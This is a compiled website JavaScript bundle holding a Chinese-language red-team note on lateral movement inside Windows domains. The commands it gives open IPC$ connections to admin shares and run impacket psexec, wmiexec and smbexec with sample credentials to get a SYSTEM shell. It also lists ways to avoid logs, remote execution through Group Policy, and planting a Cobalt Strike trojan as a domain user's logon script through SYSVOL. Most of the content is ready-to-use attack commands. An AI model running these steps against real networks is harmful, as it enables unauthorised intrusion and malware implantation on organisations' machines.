(window.webpackJsonp=window.webpackJsonp||[]).push([[55],{743:function(s,t,a){"use strict";a.r(t);var n=a(103),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"指定主机上线"}},[s._v("指定主机上线 "),a("a",{staticClass:"header-anchor",attrs:{href:"#指定主机上线"}},[s._v("#")])]),s._v(" "),a("h2",{attrs:{id:"ipc命名管道连接"}},[s._v("IPC命名管道连接 "),a("a",{staticClass:"header-anchor",attrs:{href:"#ipc命名管道连接"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("利用条件")])]),s._v(" "),a("p",[s._v("1、目标开启139、445端口")]),s._v(" "),a("p",[s._v("2、管理员开启默认共享（admin$、c$、d$等）")]),s._v(" "),a("p",[a("strong",[s._v("建立一个连接")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("net use "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("目标IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ipc$ "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"密码"')]),s._v(" /user:账号\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看当前已建立的连接")]),s._v("\nnet use\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#列出目标目录文件")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("目标IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("c$\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#映射共享磁盘到本地")]),s._v("\nnet use z: "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("c$ "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"密码"')]),s._v(" /user:"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"用户名"')]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#删除连接")]),s._v("\nnet user "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("目标IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ipc$ /del\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#删除共享映射")]),s._v("\nnet use * /del\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("h2",{attrs:{id:"无防火墙"}},[s._v("无防火墙 "),a("a",{staticClass:"header-anchor",attrs:{href:"#无防火墙"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("psexec、wmiexec等方式获取指定主机命令执行权限")])]),s._v(" "),a("p",[s._v("impacket工具包：https://github.com/SecureAuthCorp/impacket")]),s._v(" "),a("p",[a("strong",[s._v("impacket工具包中的PsExec")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python psexec.py 用户名:密码@目标IPpython psexec.py Administrator:@admin.886@10.1.1.14\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("会直接反弹一个SYSTEM权限的shell。")]),s._v(" "),a("blockquote",[a("p",[s._v("随着PsExec在内网中被严格监控，越来越多的杀毒厂商已经把PsExec加入了黑名单；")]),s._v(" "),a("p",[s._v("而且PsExec执行程序时会创建一个psexec服务，并产生大量日志，可以通过日志反推攻击流程。")])]),s._v(" "),a("p",[a("strong",[s._v("使用WMI执行程序（目标需开放135端口）")])]),s._v(" "),a("p",[s._v("WMI是Windows的一个管理工具集，Windows默认不会把WMI的操作记录到日志中")]),s._v(" "),a("p",[a("strong",[s._v("impacket工具包中的wmiexec")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python wmiexec.py administrator:@admin.886@10.1.1.14\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("Impacket中的smbexec.py")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python smbexec.py administrator:@admin.886@10.1.1.14\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"防火墙全开"}},[s._v("防火墙全开 "),a("a",{staticClass:"header-anchor",attrs:{href:"#防火墙全开"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("1、通过组策略下发命令执行")])]),s._v(" "),a("p",[s._v("改一下这个"),a("a",{attrs:{href:"https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/",target:"_blank",rel:"noopener noreferrer"}},[s._v("三好学生的脚本"),a("OutboundLink")],1),s._v("就能用")]),s._v(" "),a("p",[a("strong",[s._v("2、通过设置登陆脚本上线指定用户")])]),s._v(" "),a("blockquote",[a("p",[s._v("IPC连接到域控，copy文件，在成员上执行")]),s._v(" "),a("p",[s._v("login.bat 是cs生成的马")])]),s._v(" "),a("p",[s._v("一）使用dsmod给指定域用户设置登陆脚本")]),s._v(" "),a("p",[s._v("login.bat放在域控的NETLOGON目录下面")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("copy login.bat "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("域控"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SYSVOL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("sysvol"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("域名"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SCRIPTS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("login.bat\ndsmod user -loscr "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"test.bat"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"CN=x,OU=x,DC=x,DC=x,DC=x"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("二）登陆脚本给指定用户种马")]),s._v(" "),a("p",[s._v("login.bat放在域控的NETLOGON目录下面")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("copy login.bat "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("域控"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SYSVOL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("sysvol"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("域名"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SCRIPTS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("test.bat\nnet user xp /scriptpath:login.bat \n\ngpupdate /force\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 立即刷新组策略 使用域管权限执行  不执行也行,等待随机")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])])])}),[],!1,null,null,null);t.default=e.exports}}]);